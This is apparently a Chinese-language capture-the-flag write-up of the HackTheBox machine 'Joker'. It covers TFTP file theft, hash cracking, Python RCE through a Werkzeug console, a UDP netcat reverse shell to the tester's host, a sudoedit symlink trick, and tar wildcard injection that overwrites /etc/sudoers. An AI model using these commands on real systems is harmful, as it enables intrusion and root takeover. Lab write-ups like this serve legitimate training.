---
layout: post
title:  "HackTheBox-Joker"
date: 2024-03-15
categories: HackTheBox
permalink: /:year/:month/:day/:title.html
tags: TFTP Squid HashCat Sudo WildCards
---

![Joker](/assets/media/Joker/Joker.png)

在针对目标主机的安全渗透测试中，我们采用了一系列复杂而精细的技术手段，包含但不限于TFTP文件传输、密码哈希解密、Squid代理配置漏洞利用、高效目录扫描、Python远程代码执行（RCE）、Sudo权限提升、交互式Shell环境优化、SSH私钥认证、细致的主机信息搜集以及计划任务下通过tar命令配合通配符实现权限提升的技术等。寻求突破点的关键在于深入的信息搜集工作，特别是针对UDP端口的精确扫描。我们通过TFTP服务成功下载了Squid代理的配置文件，该文件中包含了关键的凭证信息。尽管密码凭证被MD5加密，但借助HashCat工具，我们能够破解出相应的明文密码。获取关键的用户凭证后，我们配置HTTP代理以访问内部服务，并发现本地80端口对外开放，这一发现极大地促进了我们的进展。如果此端口不可访问，则需要通过系统地遍历其他潜在开放端口来寻找可利用点。在对网站进行初步的目录探索后，我们发现了一个敏感的接口/console，它直接导向了一个Python执行环境。测试表明系统不允许通过TCP协议进行外部通信，因此构建了一个UDP反向Shell代码，成功获得了用户级权限。进一步的信息搜集揭示了用户可以无需密码即可通过sudoedit（作为sudo套件的一部分）编辑loyout.html文件。这要求一个交互式的环境，而通过升级交互环境后，我们能够通过创建符号链接将layout.html直接指向SSH私钥文件，利用这一策略成功以用户alekos的身份登录SSH。在深入探索主机目录结构时，我们注意到/development目录下藏有多个tar包，推测这些可能与计划任务中的tar命令打包活动相关。通过使用pspy工具监控，我们确认了这一过程的定时执行特性。最终，我们巧妙地利用tar命令结合通配符技术，成功提升至管理员权限，彻底掌握了目标系统的控制权。

## 0x01 侦查

### 端口扫描
首先使用 nmap 进行全端口扫描
``` shell
nmap -Pn -p- 10.10.10.21 -oA Joker-TCP-All.nmap --min-rate=1000
```
![截屏2024-03-23 23.45.06](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.45.06.png)

针对开放端口进一步扫描

``` shell
nmap -Pn -p 22,3128 -sV -sC 10.10.10.21 -oA Joker-TCP-Script.nmap
```

![截屏2024-03-23 23.37.54](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.37.54.png)

访问 3128 端口为 Squid 代理，目前 3.5.12 版本不存在已知漏洞

![截屏2024-03-23 23.43.43](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.43.43.png)

使用 UDP 协议扫描后发现目标主机的 TFTP 服务开放

``` shell
nmap -Pn -sU --top-ports 200 10.10.10.21 -oA Joker-UDP-top200.nmap
```

![截屏2024-03-23 23.44.58](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.44.58.png)

### TFTP登录

连接目标主机的 TFTP 服务，由于 TFTP 服务只提供文件读取和协议功能，不提供 FTP 那样的用户认证、目录浏览等功能，所以在使用 TFTP 服务时需要知道目标文件的绝对路径。

``` shell
tftp 10.10.10.21
```

![截屏2024-03-23 23.53.17](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.53.17.png)

通过 TFTP 服务下载 Squid 代理的配置文件，其默认路径为`/etc/squid/squid.conf`
``` shell
tftp > binary
tftp > get /etc/squid/squid.conf
```
![截屏2024-03-23 23.55.00](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.55.00.png)

配置文件中提示代理需要基础认证，同时记录了密码文件路径为`/etc/squid/passwords`
``` shell
cat squid.conf | grep -v "#"
```
![截屏2024-03-23 23.57.58](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.57.58.png)

通过 TFTP 服务下载密码文件
``` shell
tftp > get /etc/squid/passwords
```
![截屏2024-03-23 23.59.09](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.59.09.png)

成功拿到用户名和对应密码哈希

![截屏2024-03-23 23.59.57](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.59.57-1209692.png)

### 哈希破解

识别哈希值为 MD5 APR1 类型

``` shell
hashid '$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0'
```
![截屏2024-03-24 00.01.04](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2000.01.04.png)

其类型在 hashcat 中对应值为1600

![截屏2024-03-24 00.02.41](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2000.02.41.png)

使用 hashcat 爆破哈希，成功拿到明文为`ihateseafood`

``` shell
hashcat -a 0 -m 1600 passwords /usr/share/wordlists/rockyou.txt --username
```
![截屏2024-03-24 01.47.29](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2001.47.29.png)
## 0x02 上线[werkzeug]
### Squid代理
目前虽然已知 Squid 代理的认证凭据，但代理后的主机开放哪些端口仍处于未知状态，利用命令`curl`编写脚本可知哪些端口开放了 Web 服务

``` python
import subprocess
from concurrent.futures import ThreadPoolExecutor

# 代理设置
proxy = "10.10.10.21:3128"
proxy_auth = "kalamari:ihateseafood"

# 目标设置
target = "http://127.0.0.1"

# 最大同时运行的线程数
max_threads = 100

def scan_port(port):
    try:
        # 构建curl命令
        curl_cmd = [
            "curl", "-m", "5", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-x", f"http://{proxy}",
            "--proxy-user", proxy_auth, f"{target}:{port}"
        ]

        # 执行curl命令
        result = subprocess.run(curl_cmd, capture_output=True, text=True)

        # 检查HTTP响应码
        if result.stdout and result.returncode == 0:
            print(f"成功访问 {target}:{port} - 响应码: {result.stdout}")
    except Exception as e:
        print(f"扫描端口 {port} 时发生错误: {e}")

# 使用线程池并发扫描端口
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    for port in range(1, 65536):
        executor.submit(scan_port, port)
```

执行后扫描结果显示80端口开放

``` shell
python3 port_scan.py | grep "200"
```

![截屏2024-03-24 00.40.41](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2000.40.41.png)

在火狐浏览器中通过 FoxyProxy 插件配置 HTTP 代理并设置用户名密码

![截屏2024-03-23 23.39.51](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.39.51.png)

通过代理访问地址`http://127.0.0.1`界面如下：

![截屏2024-03-23 23.39.37](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-23%2023.39.37.png)

使用 gobuster 进行目录扫描，成功找到`/console`、`/list`目录
``` shell
gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/big.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128 --no-error -t 50
```
![截屏2023-09-28 09.00.55](/assets/media/16957503649402/%E6%88%AA%E5%B1%8F2023-09-28%2009.00.55.png)

### Python RCE
访问`/console`接口为 Python 命令执行界面

![截屏2023-09-28 09.01.24](/assets/media/16957503649402/%E6%88%AA%E5%B1%8F2023-09-28%2009.01.24.png)

查看 Python 版本为 2.7.12

``` python
import sys;sys.version;
```

![截屏2024-03-24 01.49.46](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2001.49.46.png)

查看当前目录、目录下的文件以及当前登录用户

``` python
import os;
os.getcwd();
os.getlistdir('.')
os.getlogin
```

![截屏2024-03-24 01.56.50](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2001.56.50.png)

首先使用 TCP 建立反弹shell，奇怪的是命令行界面出现卡死，同时本地并没有收到响应

``` python
import os, pty, socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('10.10.16.26',80))
```

难道是因为不出网吗？使用 ping 命令进行测试

``` python
import os;os.system('ping -c1 10.10.16.26')
```

![截屏2024-03-24 02.11.23](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.11.23.png)

结果显示目标主机能出网，TCP 无法建立连接可能是因为防火墙存在限制

``` shell
tcpdump -i tun0 icmp
```

![截屏2024-03-24 02.11.02](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.11.02.png)

查看 iptables 中 IPv4 的默认规则，其中入站规则只允许 ICMP、UDP、TCP:22、TCP:3128，而出站规则禁止所有TCP协议，也就是说想要拿到反弹shell可以使用 UDP、DNS 等协议

``` shell
with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
```

![截屏2024-03-24 02.17.10](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.17.10.png)

 执行命令通过 UDP 协议出站获取shell

``` shell
import os;os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.16.26 443 >/tmp/f &").read()
```
![截屏2024-03-24 02.23.53](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.23.53.png)

成功拿到反弹shell，使用 Python 调用 PTY
``` shell
nc -nvlp 443 -u
python -c 'import pty;pty.spawn("/bin/bash")'
```
![截屏2024-03-24 02.25.49](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.25.49.png)

## 0x03 权限提升[alekos]
### sudo提权
查看 sudo 权限提示可无密码执行 sudoedit 命令以 alekos 用户权限编辑`/var/www/*/*/layout.html`

``` shell
sudo -l
```

![截屏2024-03-24 02.27.18](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.27.18.png)

使用`sudoedit`命令会调用编辑器，而在当前终端环境下无法使用特殊符号来操作编辑器，一般可使用以下命令来改善交互式体验

``` shell
stty raw -echo;fg
reset
```

![截屏2023-09-28 16.25.10](/assets/media/16957503649402/%E6%88%AA%E5%B1%8F2023-09-28%2016.25.10.png)在`testing`目录下新建`test`目录，完成后通过 ln 命令创建符号链接指向 alekos 家目录下的`authorized_keys`

``` shell
ln -s /home/alekos/.ssh/authorized_keys layout.html
```
![截屏2024-03-24 02.51.37](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.51.37.png)

使用 sudoedit 命令以用户 alekos 权限编辑`layout.html`
``` shell
sudoedit -u alekos /var/www/testing/test/layout.html
```

在其中写入本地 SSH 公钥，按`^X`退出后按Y保存并回车

![截屏2024-03-24 02.44.48](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.44.48.png)

### SSH登录
配合 SSH 私钥成功登录 alekos 用户
``` shell
ssh alekos@10.10.10.21
```
![截屏2024-03-24 02.53.34](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.53.34.png)

在当前用户桌面上拿到第一个flag

``` shell
cat user.txt
```

![截屏2024-03-24 02.55.09](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.55.09.png)

## 0x04 权限提升[root]

### 信息收集
在家目录中存在目录`/backup`、`/development`，其中`/backup`目录下存在多个备份文件，有意思的是它们的生成时间都相隔五分钟

![截屏2024-03-24 03.15.44](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.15.44.png)

而`development`目录下为由 Python 构建的应用代码

![截屏2024-03-24 03.15.21](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.15.21.png)

选择任一备份文件查看可知其打包了`/development`目录中的文件，推测系统中可能存在计划任务：每五分钟使用`tar`命令备份`/development`目录

![截屏2024-03-24 03.17.37](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.17.37.png)

使用 scp 上传 [pspy](https://github.com/DominicBreuker/pspy) 用于监控系统进程

``` shell
scp pspy64 alekos@10.10.10.21:/home/alekos/
```

![截屏2024-03-24 03.08.41](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.08.41.png)

猜想验证成功，计划任务每隔五分钟执行`/root/backup.sh`

``` shell
./pspy64
```

![截屏2024-03-24 03.13.26](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.13.26.png)

### 通配符提权

利用计划任务的`tar`命令和通配符为当前用户写入 sudo 权限
``` shell
cd /home/alekos/development && echo 'echo "alekos ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
cd /home/alekos/development && echo "" > "--checkpoint-action=exec=sh privesc.sh"
cd /home/alekos/development && echo "" > --checkpoint=1
```

当执行以上命令后`tar`一旦计划任务执行就会配合参数运行`privesc.sh`

``` shell
tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh privesc.sh
```

等待五分钟后通过 sudo 命令成功拿到 root 权限

``` shell
sudo su
```
![截屏2024-03-24 03.23.28](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.23.28.png)

成功在管理员目录下拿到第二个flag

``` shell
cat root.txt
```

![截屏2024-03-24 03.25.50](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.25.50.png)

查看`backup.sh`显示其中存在`tar`命令和通配符`*`

![截屏2024-03-24 03.26.27](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.26.27.png)想要删除写入的文件可使用以下命令

``` shell
rm -- --checkpoint=1
rm -- '--checkpoint-action=exec=sh privsec.sh'
```
